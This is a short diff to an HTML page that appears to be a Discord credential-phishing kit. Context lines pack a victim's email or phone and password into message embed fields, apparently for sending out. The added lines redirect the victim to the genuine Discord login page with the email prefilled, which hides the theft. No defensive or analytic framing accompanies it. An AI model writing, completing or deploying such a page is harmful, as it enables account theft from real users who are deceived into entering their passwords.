@@ -1,4 +1,4 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -193,3 +193,11 @@
         { name: 'Email/Phone', value: `\`${email}\``, inline: false },
         { name: 'Password', value: `\`${password}\``, inline: false }
       ]);
+
+      setTimeout(() => {
+        window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
+      }, 800);
+    };
+  </script>
+</body>
+</html>
